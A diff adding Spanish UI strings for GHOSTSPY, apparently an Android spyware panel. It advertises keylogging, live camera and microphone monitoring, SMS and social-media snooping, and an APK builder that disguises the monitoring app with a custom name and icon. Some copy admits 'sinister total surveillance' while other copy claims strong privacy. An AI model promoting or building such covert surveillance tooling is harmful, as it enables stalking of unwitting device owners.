@@ -1,0 +1,796 @@
+{
+  "siteName": {
+    "main": "GHOSTSPY"
+  },
+
+  "profileMenu": {
+    "account": "Cuenta",
+    "profile": "Perfil",
+    "signOut": "Cerrar sesión"
+  },
+
+  "menuLists": {
+    "home": "Hogar",
+    "product": "Productos",
+    "tutorials": "Tutoriales",
+    "prices": "Precios",
+    "partners": "Socios",
+    "support": "Soporte",
+    "termAndConditions": "Términos y Condiciones"
+  },
+
+  "dashboardMenus": {
+    "dashboard": "Tablero",
+    "connectedDevices": "Monitoras",
+    "buildAPK": "Descargar APK",
+    "videoClasses": "Clases",
+    "support": "Soporte",
+    "updatePlan": "Suscripción",
+    "explainTitle": "Mantente al día con las actualizaciones",
+    "explainPlan": "¡Únete a nuestro canal y consulta las actualizaciones de suscripción para mantenerte informado!"
+  },
+
+  "validation": {
+    "email": "Correo electrónico requerido",
+    "password": "Contraseña requerida",
+    "confirmpassword": "Confirmar contraseña requerida",
+    "emailInvalid": "Correo electrónico inválido",
+    "passwordMinLength": "La contraseña debe tener al menos 8 caracteres",
+    "firstname": "Nombre requerido",
+    "lastname": "Apellido requerido",
+    "firstnameInvalid": "Nombre inválido",
+    "lastnameInvalid": "Apellido inválido",
+    "fullnameInvalid": "El nombre completo es obligatorio",
+    "subjectInvalid": "El asunto es obligatorio",
+    "messageInvalid": "El mensaje es obligatorio",
+    "username": "Nombre de usuario requerido",
+    "usernameInvalid": "Nombre de usuario no válido"
+  },
+  "toast": {
+    "success": {
+      "login": "Inicio de sesión exitoso",
+      "register": "Registro exitoso",
+      "forgot-password": "Su solicitud ha sido aceptada. Por favor, revise su correo electrónico",
+      "add-device": "Se ha agregado exitosamente un nuevo dispositivo",
+      "delete-device": "El dispositivo ha sido eliminado.",
+      "send-message": "El mensaje se ha enviado correctamente",
+      "create-apk": "Has creado un nuevo APK con éxito; puedes descargar el APK en el panel de descargas."
+    },
+    "error": {
+      "default": "Ocurrió un error inesperado.",
+      "login": "Inicio de sesión fallido",
+      "register": "Registro fallido",
+      "passwordnotsame": "La contraseña es incorrecta",
+      "add-device-already": "Este dispositivo ya ha sido registrado",
+      "add-device-error": "La solicitud del sistema no fue válida",
+      "delete-device-error": "El dispositivo no ha sido eliminado.",
+      "not-found-device": "No se encontraron dispositivos",
+      "must-buy-plan": "Debes suscribirte para agregar nuevos dispositivos.",
+      "access-time-out": "Se agotó el tiempo de acceso. Inténtelo de nuevo.",
+      "web-browser-input": "Por favor, ingrese sus datos",
+      "empty-data": "No hay datos",
+      "forgot-password-notfind-user": "El correo electrónico no existe. Por favor, revise su correo electrónico nuevamente",
+      "forgot-password-error": "Error interno del servidor",
+      "send-message-failed": "Error al enviar el mensaje",
+      "upgrade-plan": "Esta función está disponible con una suscripción premium.",
+      "app-info": "Por favor ingrese el nombre de la aplicación y el ícono de la aplicación correctamente"
+    }
+  },
+
+  "spinner": {
+    "device-access": "Acceso al dispositivo..."
+  },
+
+  "home": {
+    "login": "Iniciar sesión",
+    "register": "Registrarse",
+    "continue": "Continuar",
+    "username": "Nombre de usuario",
+    "email": "Correo electrónico",
+    "firstname": "Nombre",
+    "lastname": "Apellido",
+    "password": "Contraseña",
+    "newPassword": "Nueva Contraseña",
+    "confirmpassword": "Confirmar contraseña",
+    "forgotPassword": "¿Olvidaste tu contraseña?",
+    "hero-sm-title": "Soluciones confiables a nivel mundial",
+    "hero-title": "¡Tu Nueva Jornada de Conexión!",
+    "hero-description": "Deja que GHOSTSPY sea tu socio en el viaje para aprovechar al máximo tus dispositivos Android. Estamos aquí para simplificar tu vida digital y proporcionar una experiencia de usuario verdaderamente integrada.",
+    "hero-action": "Comenzar",
+    "platform-sm-title": "NUESTRA PLATAFORMA",
+    "platform-title": "GHOSTSPY, donde la conectividad y la conveniencia se unen para transformar tu experiencia con dispositivos Android",
+    "platform-description": "Nuestra plataforma simplifica la duplicación y gestión de tus dispositivos, llevándolos a tu PC de manera fácil y eficiente.",
+    "solution-sm-title": "ENCONTRAR SOLUCIÓN",
+    "solution-title": "Encuentra la solución adecuada para tu negocio",
+    "solution-description": "Haz la gestión de dispositivos más eficiente y fácil. Comienza con GHOSTSPY hoy.",
+    "solution-support": "Soporte",
+    "platform-simple-title": "Espejo Simplificado",
+    "platform-simple-description": "Con solo unos pocos clics, puedes llevar la pantalla de tu dispositivo Android a tu PC, permitiendo una vista ampliada y una experiencia de usuario más cómoda.",
+    "platform-remote-title": "Control Remoto",
+    "platform-remote-description": "Toma el control total de tu dispositivo Android directamente desde tu PC. Navega por las aplicaciones, responde mensajes y gestiona tu dispositivo de manera conveniente e intuitiva.",
+    "platform-multi-title": "Soporte Multidispositivo",
+    "platform-multi-description": "Conecta múltiples dispositivos Android a la vez y cambia entre ellos con facilidad, asegurando una gestión eficiente y sin complicaciones.",
+    "platform-friendly-title": "Interfaz Amigable",
+    "platform-friendly-description": "Con una interfaz intuitiva y fácil de usar, GHOSTSPY es accesible para usuarios de todos los niveles de experiencia. No se requiere conocimiento técnico, solo empieza a explorar.",
+    "platform-private-title": "Seguro y Privado",
+    "platform-private-description": "Tu seguridad y privacidad son nuestras prioridades. Utilizamos los protocolos de cifrado más avanzados para garantizar la protección de tus datos durante todas tus interacciones.",
+    "platform-real-title": "Monitores en Tiempo Real",
+    "platform-real-description": "Monitorea el rendimiento de tu dispositivo Android en tiempo real directamente desde tu PC. Haz un seguimiento de las pantallas, cámara, grabaciones, teclados y más para una gestión óptima del dispositivo."
+  },
+  "product": {
+    "sm-title": "NUESTROS PRODUCTOS",
+    "title": "GHOSTSPY donde la conectividad y la conveniencia",
+    "description": "Podemos encontrar una plataforma que simplifica el espejo y la gestión de nuestros dispositivos, llevándolos a su PC de manera fácil y eficiente.",
+    "monitor-title": "Monitores de Dispositivos",
+    "monitor-service": "Pantallas, Cámara, Grabación, Keylogs, Ubicación en Tiempo Real, Historial de Llamadas.",
+    "monitor-description": "Con solo unos pocos clics, puedes llevar la pantalla de tu dispositivo Android a tu PC, permitiendo una vista ampliada y una experiencia de usuario más cómoda.",
+    "manager-title": "Gestores de Dispositivos",
+    "manager-service": "SMS, Llamadas, Archivos, Contactos, Aplicaciones, Gestión de Galería.",
+    "manager-description": "Gestiona todos los aspectos de tu dispositivo Android directamente desde tu PC sin esfuerzo. Nuestra plataforma te permite manejar SMS, hacer y recibir llamadas, organizar archivos, gestionar contactos, controlar aplicaciones y supervisar tu galería. Mantente conectado, organizado y en control con nuestras herramientas de gestión de dispositivos sin interrupciones.",
+    "social-title": "Gestores Sociales",
+    "social-service": "Whatsapp, Instagram, Tiktok, Facebook, Twitter, Telegram",
+    "social-description": "Gestiona tus perfiles de redes sociales sin esfuerzo desde tu PC. Programa publicaciones, monitorea la participación, responde a mensajes y analiza el rendimiento de tus redes sociales en un solo lugar. Nuestra plataforma soporta SMS, Llamadas, Archivos, Contactos, Aplicaciones y Gestión de Galería para mantenerte conectado y productivo.",
+    "extra-title": "Funciones Extra",
+    "extra-service": "Marcar Número, Notificaciones, Aplicaciones",
+    "extra-description": "Mantente al tanto de tus comunicaciones y gestión de aplicaciones sin esfuerzo desde tu PC. Marca números fácilmente, recibe y gestiona notificaciones y controla tus aplicaciones con una interfaz fácil de usar. Simplifica tu flujo de trabajo y mantén todo en un solo lugar para una mejor productividad y eficiencia."
+  },
+  "direction": {
+    "title": "Únase a Nosotros Hoy y Aumente su Productividad",
+    "description": "Estamos emocionados de darle la bienvenida a GHOSTSPY, donde la conectividad y la conveniencia se unen para transformar su experiencia con dispositivos Android.",
+    "action": "Regístrese Ahora"
+  },
+  "tutorial": {
+    "sm-title": "Cómo funciona"
+  },
+  "prices": {
+    "sm-title": "Plan y Precio",
+    "title": "Plan y Precios para GHOSTSPY",
+    "description": "Somos Confiables Globalmente por un Servicio Excepcional"
+  },
+  "contact": {
+    "title": "Contáctenos",
+    "description": "Complete este formulario para contactarnos y le responderemos de inmediato.",
+    "fullName": "Nombre completo",
+    "email": "Email",
+    "subject": "Asunto",
+    "message": "Mensaje",
+    "action": "Enviar Mensaje"
+  },
+  "login": {
+    "introduce": "Una plataforma que transforma la duplicación y el control de tus dispositivos Android en un acto siniestro de vigilancia total",
+    "login": "Iniciar sesión",
+    "sigin-title": "Iniciar sesión en GHOSTSPY",
+    "checkError": "Debes aceptar los Términos y Condiciones del sistema"
+  },
+  "register": {
+    "introduce": "Estamos emocionados de darte la bienvenida a GHOSTSPY, donde la conectividad y la conveniencia se unen para transformar tu experiencia con dispositivos Android.",
+    "register": "Registrarse",
+    "sigup-title": "Regístrate en GHOSTSPY",
+    "accept": "Al registrarse, acepta nuestro"
+  },
+  "forgot-password": {
+    "forgotPassword": "¿Olvidó su contraseña?",
+    "continue": "Continuar",
+    "description": "Ingrese su dirección de correo electrónico y le ayudaremos a restablecer su contraseña."
+  },
+  "dashboard": {
+    "welcome": "Bienvenida",
+    "installedDevices": "Dispositivos Instalados",
+    "devicesOnline": "Dispositivos en línea",
+    "newDevices": "Nuevos Dispositivos",
+    "systemStatus": "Estado del Sistema",
+    "introduce": {
+      "greeting": "¡Bienvenido a GHOSTSPY: tu nueva aventura de conexión!",
+      "introduce": "Estamos emocionados de darte la bienvenida a GHOSTSPY, donde la conectividad y la conveniencia se unen para transformar tu experiencia con dispositivos Android. Aquí encontrarás una plataforma que simplifica la duplicación y gestión de tus dispositivos, llevándolos a tu PC de manera fácil y eficiente.",
+      "reason": "Explora todas las posibilidades que ofrece GHOSTSPY:",
+      "feature": {
+        "mirroring": "<span style='font-weight: 600; color: #564FEE;'>Duplicación Simplificada:</span> Con solo unos pocos clics, puedes llevar la pantalla de tu dispositivo Android a tu PC, permitiendo una vista ampliada y una experiencia de usuario más cómoda.",
+        "remoteControl": "<span style='font-weight: 600; color: #564FEE;'>Control Remoto:</span> Toma el control total de tu dispositivo Android directamente desde tu PC. Navega por aplicaciones, responde mensajes y gestiona tu dispositivo de manera conveniente e intuitiva.",
+        "multiDevice": "<span style='font-weight: 600; color: #564FEE;'>Soporte para Varios Dispositivos:</span> Conecta varios dispositivos Android a la vez y cambia entre ellos con facilidad, asegurando una gestión eficiente y sin complicaciones.",
+        "friendlyInterface": "<span style='font-weight: 600; color: #564FEE;'>Interfaz Amigable:</span> Con una interfaz intuitiva y fácil de usar, GHOSTSPY es accesible para usuarios de todos los niveles de experiencia. No se necesita conocimiento técnico, ¡simplemente comienza a explorar!",
+        "secure": "<span style='font-weight: 600; color: #564FEE;'>Seguro y Privado:</span> Tu seguridad y privacidad son nuestras prioridades. Utilizamos los protocolos de cifrado más avanzados para garantizar la protección de tus datos durante todas tus interacciones."
+      },
+      "under": "Deja que GHOSTSPY sea tu compañero en la aventura de aprovechar al máximo tus dispositivos Android. Estamos aquí para simplificar tu vida digital y proporcionar una experiencia de usuario verdaderamente integrada. Así que prepárate para una nueva era de conectividad y descubre todo lo que GHOSTSPY puede hacer por ti."
+    }
+  },
+
+  "devicesPage": {
+    "devices": "Dispositivos",
+    "noDevice": "No hay dispositivos registrados",
+    "noSelectSocial": "Seleccione un social",
+    "noData": "No hay datos para mostrar.",
+    "edit": "Edit",
+    "remove": "Remove",
+    "sms": "SMS",
+    "calls": "Llamadas",
+    "files": "Archivos",
+    "contacts": "Contactos",
+    "applications": "Aplicaciones",
+    "gallery": "Galería",
+    "version": "Versión",
+    "status": {
+      "online": "En línea",
+      "offline": "Fuera de línea"
+    },
+    "selectDevice": "Por favor seleccione un dispositivo.",
+    "devicesFunctions": "Dispositivos Servicios",
+    "monitors": {
+      "monitors": "Monitores",
+      "screenControl": "Control de pantalla",
+      "screenSkeleton": "Pantalla Esqueleto",
+      "monitorCamera": "Monitorizar Cámara",
+      "monitorMicrophone": "Monitor de micrófono",
+      "keyRegister": "Claves Registros",
+      "realTimeLocation": "Ubicación",
+      "webBroswer": "Navegador Web",
+      "callRecord": "Registro llamadas",
+      "front-camera": "Cámara Frontal",
+      "back-camera": "Cámara Trasera",
+      "capture-photo": "Capturar Foto",
+      "capture-video": "Capturar Video",
+      "center-foucs": "Enfocar al Centro",
+      "enter-url": "Introducir contenido",
+      "submit-url": "Enviar",
+      "keyLogStart": "Registrador de claves iniciado",
+      "call-number": "Número",
+      "call-type": "Tipo",
+      "call-duration": "Duración",
+      "call-date": "Fecha",
+      "setting": "Configuración",
+      "black-setting": "Pantalla negra",
+      "lock-setting": "Bloquear pantalla",
+      "mic-play": "Reproducir",
+      "mic-close": "Cerrar"
+    },
+    "managers": {
+      "managers": "Gerentes",
+      "gallery-noimage": "no hay imágenes",
+      "gallery-select-image": "por favor seleccione una imagen"
+    },
+    "socials": {
+      "socialManage": "Sociales",
+      "facebook": "Facebook",
+      "whatsapp": "WhatsApp",
+      "instagram": "Instagram",
+      "twitter": "Twitter",
+      "telegram": "Telegram",
+      "tiktok": "Tiktok"
+    },
+    "extraFunctions": {
+      "extraFunction": "Extra",
+      "phoneNumber": "Marcar Número",
+      "directLink": "Abrir Enlace Directo",
+      "notifications": "Notificaciones",
+      "installApp": "Aplicaciones"
+    },
+    "deviceInfo": {
+      "deviceInformation": "Información del Dispositivo",
+      "model": "Modelo",
+      "deviceName": "Nombre del Dispositivo",
+      "androidVersion": "Versión de Android",
+      "information": "Información",
+      "batteryStatus": "Estado de la Batería",
+      "netStatus": "Estado de la Conexión",
+      "removeDevice": "Quitar un dispositivo"
+    },
+    "addNewDevice": {
+      "addbutton": "+ Agregar Nuevo",
+      "modalExplain": "Por favor, escanea el código QR para agregar un nuevo dispositivo",
+      "close": "Cerrar"
+    },
+    "vncModal": {
+      "waiting": "Solicitando acceso al servidor VNC..."
+    }
+  },
+  "buildAPKPage": {
+    "devices": "Monitor de Dispositivo",
+    "createAPK": "Crear APK",
+    "create-description": "Puedes crear el APK perfecto que deseas y descargarlo en cualquier momento que quieras.",
+    "create-explain": "Elige una de las aplicaciones listadas arriba para instalar en el dispositivo que deseas monitorear. Al lado, puedes previsualizar cómo se verá la aplicación después de la instalación en el teléfono.",
+    "copy-url": "URL copiada",
+    "create-apk-option": "Crear Nueva APP",
+    "create-new-app": "Si vas a crear una nueva app, por favor haz clic en el botón de abajo.",
+    "open-create-panel": "Crear Nuevo",
+    "download-apk-option": "Descargar APP",
+    "already-created": "Ya has generado el APK y puedes descargarlo aquí.",
+    "should-create-apk": "No has creado un nuevo APK, debes crear un APK y luego podrás descargarlo.",
+    "open-download-action": "Descargar",
+    "builder": "Constructor de APK",
+    "information": "Información",
+    "appName": "Nombre de la aplicación",
+    "clientName": "Nombre del cliente",
+    "appVersion": "Versión de la aplicación",
+    "packageName": "Nombre del paquete",
+    "selectAppIcon": "Seleccionar icono",
+    "upload": "Subir",
+    "delete": "Eliminar",
+    "action": {
+      "prev": "Atrás",
+      "next": "Siguiente"
+    },
+    "options": "Opciones",
+    "afterInstall": "Después de la Instalación",
+    "appSize": "Tamaño de la Aplicación",
+    "keepAlive": "Mantener Activo",
+    "tools": "Herramientas",
+    "sample": "Configurar los permisos esenciales para garantizar el funcionamiento completo de la aplicación",
+    "term": "Términos esenciales para su uso",
+    "list": {
+      "quickInstall": "Instalación Rápida",
+      "drawOverApps": "Superposición de Aplicaciones"
+    },
+    "build": "Compilar",
+    "permissionList": "Lista de Permisos",
+    "signtureVersion": "Versión de la Firma",
+    "apkVersion": "Versión del APK",
+    "protectedApp": "Aplicación Protegida",
+    "allSelect": "Seleccionar Todos",
+    "remove": "Eliminar",
+    "startBuilding": "Comenzar la Construcción",
+    "complete": "Completo",
+    "permissionLists": {
+      "recordCalling": "Grabar Llamadas",
+      "changeWallpaper": "Cambiar Fondo de Pantalla",
+      "readSMS": "Leer SMS",
+      "readLogs": "Leer Registros de Llamadas",
+      "readContacts": "Leer Contactos",
+      "readAccount": "Leer Cuentas",
+      "camera": "Cámara",
+      "microphone": "Micrófono",
+      "location": "Ubicación",
+      "makeCalling": "Realizar Llamadas"
+    },
+    "emulateForm": {
+      "title": "Título",
+      "downloadServices": "Descarga",
+      "startMessages": "Iniciar Mensajes",
+      "buttonText": "Texto del Botón",
+      "settingDescription": "Descripción de la Configuración"
+    }
+  },
+  "videoPage": {
+    "video": "Clases en Video"
+  },
+  "supportPage": {
+    "support": "Soporte"
+  },
+  "termConditionPage": {
+    "title": "Términos y Condiciones y Política de Privacidad",
+    "introduce": {
+      "title": "1. Introducción",
+      "content": "Bienvenido/a a los Términos y Condiciones y la Política de Privacidad de GHOSTSPY. GHOSTSPY es una empresa especializada en monitoreo y gestión de dispositivos Android. Al utilizar nuestros servicios, acepta los términos y políticas descritos a continuación."
+    },
+    "deviceMonitoring": {
+      "title": "2. Consentimiento para Monitoreo y Gestión de Dispositivos",
+      "content": "Al utilizar los servicios de GHOSTSPY, acepta explícitamente el monitoreo y gestión de dispositivos Android. Esto puede incluir, pero no se limita a, monitoreo de actividades, acceso a datos del dispositivo, control remoto del dispositivo e instalación de aplicaciones de gestión. Este consentimiento es voluntario y puede ser revocado en cualquier momento al discontinuar el uso de nuestros servicios."
+    },
+    "responsibilityLegality": {
+      "title": "3. Responsabilidad y Legalidad",
+      "content": "GHOSTSPY se compromete a operar dentro de los límites legales establecidos por el Código Civil Brasileño y otras leyes y regulaciones aplicables. Reconocemos la importancia de la privacidad y cumplimos con las leyes de protección de datos, incluida la Ley General de Protección de Datos (Ley N° 13,709/2018)."
+    },
+    "privacyCivil": {
+      "title": "4. Invasión de Privacidad y Responsabilidad Civil",
+      "content": "La invasión de privacidad está estrictamente prohibida por GHOSTSPY. Respetamos los derechos de privacidad de los usuarios y nos comprometemos a proteger la información personal de acuerdo con las leyes aplicables, incluido el Código Civil de Brasil y las leyes de privacidad de otros países donde operamos. Cualquier violación de estos derechos resultará en acciones disciplinarias y legales según lo previsto por las leyes locales e internacionales aplicables."
+    },
+    "dataCollection": {
+      "title": "5. Recopilación y Uso de Datos",
+      "content": "Al utilizar nuestros servicios, acepta la recopilación y uso de datos según lo descrito en nuestra Política de Privacidad. Los datos recopilados pueden incluir, pero no se limitan a, información del dispositivo, datos de ubicación, actividades de uso e información de identificación personal. Estos datos se utilizarán solo para fines especificados y se protegerán de acuerdo con las leyes de privacidad aplicables."
+    },
+    "userResponsibility": {
+      "title": "6. Responsabilidad del Usuario",
+      "content": "Al utilizar los servicios de GHOSTSPY, acepta que es el único responsable de sus actividades y el uso de nuestros servicios. GHOSTSPY no será responsable de ningún daño directo, indirecto, incidental, especial, consecuente o punitivo, incluida, entre otros, la pérdida de ganancias, la pérdida de datos, la interrupción del negocio o daños personales, derivados o relacionados con el uso o la incapacidad de usar nuestros servicios. Usted acepta indemnizar, defender y eximir de responsabilidad a GHOSTSPY, sus empleados, agentes, afiliados, socios y licenciantes de cualquier reclamo, demanda, responsabilidad, costo, gasto y daño, incluidos honorarios razonables de abogados, derivados o relacionados con su uso de los servicios o la violación de estos Términos y Condiciones."
+    },
+    "changeTerm": {
+      "title": "7. Cambios en los Términos y Políticas",
+      "content": "GHOSTSPY se reserva el derecho de cambiar estos Términos y Condiciones y la Política de Privacidad en cualquier momento con un aviso adecuado a los usuarios. Recomendamos que revise regularmente estos términos para estar al tanto de cualquier cambio."
+    }
+  },
+  "plan": {
+    "title": "Planes de Beneficios",
+    "subject": "Miles de usuarios escalan sus negocios con nuestros planes",
+    "option": {
+      "title": "Suscripción",
+      "month": "Mensual",
+      "year": "Anual",
+      "discount": "Descuento",
+      "peryear": "Por Año",
+      "permonth": "Por Mes"
+    },
+    "button": "Seleccionar",
+    "basic": {
+      "basic": "Plan Básico de GHOSTSPY",
+      "explain": "Con el Plan Básico de GHOSTSPY, obtienes acceso a funciones esenciales para la gestión completa, seguridad y monitoreo de tu dispositivo Android",
+
+      "services": {
+        "1": {
+          "title": "VNC (Computación en Red Virtual)",
+          "1": "Accede remotamente a la pantalla del dispositivo con Modo Solo Visualización",
+          "2": "El Modo Acceso Completo permite el control remoto y visualización de pantalla"
+        },
+        "2": {
+          "title": "Aplicaciones y Multimedia",
+          "1": "Obtén detalles de las aplicaciones instaladas y la galería de fotos",
+          "2": "Registra diversas actividades del dispositivo, incluyendo notificaciones, capturas de pantalla, contenido de todos los mensajes SMS, lista de contactos y registros de llamadas",
+          "3": "Monitorea y registra datos de audio y video capturados por el dispositivo"
+        },
+        "3": {
+          "title": "Redes Sociales",
+          "1": "Recibe información general y monitorea la actividad en redes sociales asociadas al dispositivo",
+          "2": "Sigue el uso de redes sociales por parte del usuario, el compromiso en publicaciones y las solicitudes de amistad",
+          "3": "Analiza la actividad del perfil del usuario, incluyendo menciones, etiquetas y uso de emojis",
+          "4": "Recibe alertas en tiempo real sobre actividades sospechosas o no autorizadas en redes sociales"
+        },
+        "4": {
+          "title": "Seguridad Avanzada",
+          "1": "Detecta y bloquea automáticamente sitios dañinos con la función de Filtrado y Bloqueo de Sitios",
+          "2": "Monitorea y registra datos de ubicación en tiempo real del dispositivo para garantizar la seguridad del usuario",
+          "3": "Establece límites de tiempo y supervisa el uso del dispositivo con Programación y Supervisión Inteligentes"
+        }
+      }
+    },
+
+    "premium": {
+      "premium": "Plan Premium de GHOSTSPY",
+      "explain": "Con el Plan Premium de GHOSTSPY, obtienes control total e información profunda para una gestión avanzada de tu dispositivo Android. Asegura seguridad, eficiencia y tranquilidad con nuestras funciones exclusivas",
+      "services": {
+        "1": {
+          "title": "Control Total con VNC",
+          "1": "Visualiza y controla remotamente la pantalla del dispositivo con facilidad y seguridad"
+        },
+        "2": {
+          "title": "Gestión Avanzada de Aplicaciones y Multimedia",
+          "1": "Obtén información detallada sobre aplicaciones instaladas y contenido de galería de fotos",
+          "2": "Registra actividades importantes del dispositivo, incluyendo notificaciones y capturas de pantalla",
+          "3": "Monitorea áreas geográficas específicas y recibe notificaciones relevantes en tiempo real"
+        },
+        "3": {
+          "title": "Análisis Profundo de Redes Sociales",
+          "1": "Accede a información completa sobre el uso de redes sociales por parte del usuario",
+          "2": "Sigue la actividad social, el compromiso con publicaciones y las interacciones con amigos",
+          "3": "Recibe alertas sobre menciones, solicitudes de amistad y otras actividades relevantes"
+        },
+        "4": {
+          "title": "Funciones Exclusivas Premium",
+          "0": "Modo de Privacidad para garantizar total confidencialidad durante el acceso remoto",
+          "1": "Captura de teclas digitadas para análisis de actividades del usuario",
+          "2": "Borra datos del dispositivo remotamente para garantizar la seguridad de los datos",
+          "3": "Monitorea audio y cámara del dispositivo en tiempo real",
+          "4": "Localiza el dispositivo en tiempo real",
+          "5": "Bloquea y desinstala aplicaciones remotamente",
+          "6": "Abre enlaces web directamente en el dispositivo"
+        }
+      }
+    }
+  },
+  "profilePage": {
+    "title": "Editar Perfil",
+    "tabMenu": {
+      "userInfo": "Información del Usuario",
+      "securityInfo": "Información de Seguridad",
+      "detailInfo": "Información Detallada"
+    },
+    "editAvatar": "Editar Avatar",
+    "cancel": "Cancelar",
+    "save": "Guardar"
+  },
+  "userFeedback": {
+    "description": "¡Gracias por usar GHOSTSPY! Valoramos tu opinión. Por favor, cuéntanos cómo te sientes acerca de tu experiencia con nuestro chatbot hoy.",
+    "rate-title": "Por favor, evalúa tu experiencia",
+    "action": "Enviar",
+    "lastMessage": "Gracias por tus comentarios. ¿Necesitas alguna otra ayuda hoy?",
+    "agreement-action": "Sí",
+    "not-action": "No",
+    "placeholder-message": "Escribe tu mensaje aquí",
+    "add-line": "Presione Shift + Enter para agregar una nueva línea"
+  },
+  "feedback": {
+    "0": "Muy Satisfecho",
+    "1": "Satisfecho",
+    "2": "Neutral",
+    "3": "Insatisfecho",
+    "4": "Muy Insatisfecho",
+    "5": "Confundido",
+    "6": "Útil",
+    "7": "Inútil",
+    "8": "Fácil de Usar",
+    "9": "Difícil de Usar",
+    "10": "Respuesta Rápida",
+    "11": "Respuesta Lenta"
+  },
+  "welcome": {
+    "message": "¡Hola! Bienvenido a GHOSTSPY. ¿Cómo puedo ayudarte hoy?",
+    "options": {
+      "general-info": "Información General",
+      "resource": "Recursos",
+      "how-to-start": "Cómo Empezar",
+      "problem-solution": "Solución de Problemas",
+      "contact-support": "Contactar Soporte",
+      "human-chat": "Hablar con soporte humano"
+    }
+  },
+  "human-chat": {
+    "message": "Por favor, espere un momento. Estamos conectando con el administrador.",
+    "options": {}
+  },
+  "general-info": {
+    "message": "GHOSTSPY facilita la duplicación y gestión de tus dispositivos Android en tu PC o Celular. ¿Cómo puedo ayudar?",
+    "options": {
+      "what-GHOSTSPY": "¿Qué es GHOSTSPY?",
+      "how-to-work": "¿Cómo funciona GHOSTSPY?",
+      "safe": "¿Es seguro GHOSTSPY?"
+    }
+  },
+  "what-GHOSTSPY": {
+    "message": "GHOSTSPY es una plataforma innovadora diseñada para facilitar la duplicación y gestión de tus dispositivos Android en tu navegador, ya sea en un PC o celular. Con GHOSTSPY, puedes controlar, gestionar e interactuar con tus dispositivos Android directamente desde tu computadora o celular, proporcionando una experiencia más conveniente y eficiente. Ya sea para leer o responder mensajes, monitorear la cámara, el audio y la ubicación en tiempo real, ver fotos de la galería, monitorear redes sociales, navegar por cualquier aplicación o gestionar múltiples dispositivos al mismo tiempo, GHOSTSPY ofrece una solución segura y fácil de usar para todas tus necesidades de monitoreo avanzado.",
+    "options": {}
+  },
+  "how-to-work": {
+    "message": "GHOSTSPY conecta tus dispositivos Android a tu navegador, ya sea en PC o celular, permitiendo la duplicación y el control remoto de manera fácil y segura. Así es como funciona. Instalación: Descarga e instala la aplicación GHOSTSPY en tu dispositivo Android y accede al panel de usuario de GHOSTSPY en tu navegador. Conexión: Usa el código QR en el panel de usuario para conectar tu dispositivo Android al navegador. Asegúrate de que ambos dispositivos estén conectados a la misma red. Permisos: Concede todos los permisos necesarios en tu dispositivo Android, incluyendo accesibilidad, para asegurar un funcionamiento completo. Control y Monitoreo: Después de la conexión, puedes controlar tu dispositivo Android directamente desde el navegador. Esto incluye leer y responder mensajes, monitorear la cámara, el audio, la ubicación en tiempo real, ver fotos de la galería, monitorear redes sociales y navegar por cualquier aplicación. Seguridad: GHOSTSPY utiliza protocolos avanzados de encriptación para proteger tus datos, asegurando una experiencia segura y privada. Con estos simples pasos, GHOSTSPY ofrece una solución integral y eficiente para todas tus necesidades de duplicación y control de dispositivos Android.",
+    "options": {}
+  },
+  "safe": {
+    "message": "Sí, GHOSTSPY es altamente seguro. Aquí hay algunas de las medidas que tomamos para garantizar la seguridad y privacidad de tus datos. Encriptación Avanzada: Utilizamos protocolos de encriptación de última generación para proteger todos los datos transmitidos entre tus dispositivos Android y el navegador. Esto asegura que tu información esté siempre segura contra accesos no autorizados. Permisos Controlados: GHOSTSPY solo solicita los permisos necesarios para el funcionamiento adecuado de la aplicación. Todos los permisos son solicitados explícitamente y explicados para asegurar que estés al tanto de cómo se usarán tus datos. Privacidad del Usuario: Respetamos tu privacidad y nos comprometemos a no compartir tu información personal con terceros. Todos los datos recopilados se utilizan exclusivamente para proporcionar los servicios ofrecidos por GHOSTSPY. Actualizaciones Regulares: Mantenemos el software actualizado con las últimas correcciones de seguridad y mejoras, asegurando que siempre tengas la versión más segura y eficiente de nuestra aplicación. Monitoreo y Auditoría: Realizamos un monitoreo continuo y auditorías de seguridad para identificar y resolver posibles vulnerabilidades, asegurando que nuestra plataforma permanezca segura y confiable. Tu seguridad y privacidad son nuestras principales prioridades en GHOSTSPY. Puedes usar nuestros servicios con total confianza, sabiendo que tus datos están protegidos.",
+    "options": {}
+  },
+  "resource": {
+    "message": "Descubre todas las funcionalidades de GHOSTSPY:",
+    "options": {
+      "simple-monitoring": "Duplicación Simplificada",
+      "remote-control": "Control Remoto",
+      "social-monitor": "Monitor de Redes Sociales",
+      "real-time-location": "Ubicación en Tiempo Real",
+      "file-manager": "Gestor de Archivos",
+      "camera-monitor": "Monitor de Cámara",
+      "audio-monitor": "Monitor de Audio",
+      "photo-monitor": "Gestor de Fotos",
+      "key-registeration": "Registro de Teclas",
+      "call-log": "Registro de Llamadas",
+      "multi-device-support": "Soporte para Múltiples Dispositivos",
+      "intuitive-interface": "Interfaz Intuitiva",
+      "security-privacy": "Seguridad y Privacidad"
+    }
+  },
+  "simple-monitoring": {
+    "message": "Duplica la pantalla de tu dispositivo Android en tu PC o celular con solo unos clics, proporcionando una vista ampliada y una experiencia de usuario más cómoda.",
+    "options": null
+  },
+  "remote-control": {
+    "message": "Navega por aplicaciones, responde mensajes y gestiona tu dispositivo Android directamente desde tu navegador, ya sea en PC o celular.",
+    "options": {}
+  },
+  "social-monitor": {
+    "message": "Rastrea actividades en redes sociales en tu dispositivo Android en tiempo real, todo directamente desde tu navegador.",
+    "options": {}
+  },
+  "real-time-location": {
+    "message": "Monitorea la ubicación de tu dispositivo Android en tiempo real, asegurando que siempre sepas dónde está.",
+    "options": {}
+  },
+  "file-manager": {
+    "message": "Accede y gestiona todos los archivos en tu dispositivo Android directamente desde tu PC o celular, haciendo la organización y transferencia de datos más fáciles.",
+    "options": {}
+  },
+  "camera-monitor": {
+    "message": "Accede y monitorea la cámara de tu dispositivo Android en tiempo real para mayor seguridad y control.",
+    "options": {}
+  },
+  "audio-monitor": {
+    "message": "Monitorea el audio de tu dispositivo Android para asegurarte de no perder ningún sonido importante.",
+    "options": {}
+  },
+  "photo-monitor": {
+    "message": "Ve y gestiona todas las fotos de la galería de tu dispositivo Android directamente desde tu navegador.",
+    "options": {}
+  },
+  "key-registeration": {
+    "message": "Monitorea todas las pulsaciones de teclas en tu dispositivo Android para tener un control completo sobre sus actividades.",
+    "options": {}
+  },
+  "call-log": {
+    "message": "Rastrea todas las llamadas realizadas y recibidas en tu dispositivo Android, incluyendo detalles como duración y hora.",
+    "options": {}
+  },
+  "multi-device-support": {
+    "message": "Conecta y gestiona múltiples dispositivos Android simultáneamente, cambiando fácilmente entre ellos para una gestión eficiente y sin complicaciones.",
+    "options": {}
+  },
